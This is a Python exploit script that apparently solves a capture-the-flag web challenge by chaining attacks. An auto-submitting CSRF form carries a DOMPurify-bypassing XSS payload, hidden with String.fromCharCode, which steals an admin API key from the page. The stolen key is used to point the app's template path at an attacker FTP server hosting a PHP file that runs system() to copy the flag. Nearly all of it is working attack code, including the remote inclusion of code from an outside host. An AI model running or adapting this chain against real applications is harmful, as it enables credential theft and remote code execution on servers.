import requests, os, time, threading, pyftpdlib
from flask import Flask, Response, send_file, request

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
EXFIL_HOST, EXFIL_PORT, EXFIL_FTP_PORT = "172.17.0.1", 9090, 2121
EXFIL_URL = f"http://{EXFIL_HOST}:{EXFIL_PORT}"

USERNAME = "username"
PASSWORD = "password"

def start_server():
	app = Flask(__name__)

	@app.route("/", methods=["GET"])
	def index():
		html = f"""
<html>
  <body>
	<form action="http://127.0.0.1:80/api/updateStatus" method="POST" enctype="text/plain">
		<input type="hidden" name='{{"status": "{xss()}","foo' value='":"b"}}' />
	</form>
	<script>document.forms[0].submit();</script>
  </body>
</html>
"""
		resp = Response(html)
		resp.headers["Content-Type"] = "text/html"
		return resp, 200

	print("[+] Starting Flask server...")
	app.run(host="0.0.0.0", port=EXFIL_PORT, debug=False, threaded=True)

def start_ftp_server():
	with open("index.php", "w") as f:
		f.write("<?php system('cp /flag* /app/public/flag.txt'); ?>")

	authorizer = DummyAuthorizer()
	authorizer.add_anonymous(homedir=".", perm="elradfmw")

	handler = FTPHandler
	handler.authorizer = authorizer
	handler.passive_ports = range(50000, 51000) # enable on firewall

	ftp_address = ("0.0.0.0", EXFIL_FTP_PORT)
	ftp_server = FTPServer(ftp_address, handler)

	print("[+] Starting FTP server on port 2121...")
	ftp_server.serve_forever()

def register_user(session):
	print("[+] Registering new user")
	session.post(f'{CHALLENGE_URL}/api/register',
		json={"username": USERNAME, "password": PASSWORD})

def login_user(session):
	print("[+] Logging in user")
	session.post(f'{CHALLENGE_URL}/api/login',
		json={"username": USERNAME, "password": PASSWORD})

def rfi():
	return f"ftp://{EXFIL_HOST}:{EXFIL_FTP_PORT}/index.php?a="

def xss():
	payload = f"const settings={{template_path:'{rfi()}',site_name:'Adventure Quest',max_players:100}};const key=document.getElementById('apiKey').innerHTML;fetch('/api/admin/appSettings',{{method:'POST',headers:{{'Content-Type':'application/json','X-API-Key':key}},body:JSON.stringify(settings)}});"

	chars = []
	for c in payload:
		chars.append(f"String.fromCharCode({ord(c)})")

	return f"""<form id=\\"x \\"><svg><style><a id=\\"</style><img src=x onerror=eval({'+'.join(chars)})>\\"></a></style></svg></form><input form=\\"x\\" name=\\"namespaceURI\\">"""

def trigger_bot(session):
	print("[+] Triggering CSRF with PHP JSON bug")
	data = {
		"companions": 1,
		"questId": "1",
		"questUrl": EXFIL_URL
	}
	session.post(f"{CHALLENGE_URL}/api/claimQuest", json=data)

def trigger_xss(session):
	print("[+] Triggering XSS with DOM purify bypass")
	data = {
		"companions": 1,
		"questId": "1",
		"questUrl": "http://127.0.0.1:1337"
	}
	session.post(f"{CHALLENGE_URL}/api/claimQuest", json=data)

def trigger_rfi(session):
	print("[+] Triggering RFI via FTP")
	session.get(f"{CHALLENGE_URL}/")

def get_flag():
	flag = requests.get(f"{CHALLENGE_URL}/flag.txt").text
	return flag

if __name__ == '__main__':
	global admin_token

	server = threading.Thread(target=start_server)
	server.start()

	ftp_thread = threading.Thread(target=start_ftp_server, daemon=True)
	ftp_thread.start()

	time.sleep(2)

	session = requests.Session()

	register_user(session)
	login_user(session)
	trigger_bot(session)
	time.sleep(15)
	trigger_xss(session)
	time.sleep(10)

	trigger_rfi(session)
	time.sleep(5)
	print(get_flag())
	os.system("rm index.php")
